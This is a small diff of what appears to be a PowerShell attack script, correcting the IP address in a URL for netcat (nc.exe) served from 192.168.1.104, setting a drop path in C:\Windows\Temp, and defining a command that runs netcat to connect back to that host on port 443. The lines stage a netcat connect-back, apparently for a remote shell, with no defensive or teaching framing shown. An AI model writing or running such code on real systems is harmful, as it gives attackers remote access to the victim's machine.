@@ -1,5 +1,5 @@
 # Define variable
-$ncUrl = "https://192.1681.104:80/nc.exe"
+$ncUrl = "https://192.168.1.104:80/nc.exe"
 $ncPath = "C:\Windows\Temp\nc.exe"
 $ncCommand = "C:\Windows\Temp\nc.exe 192.168.1.104 443"
 
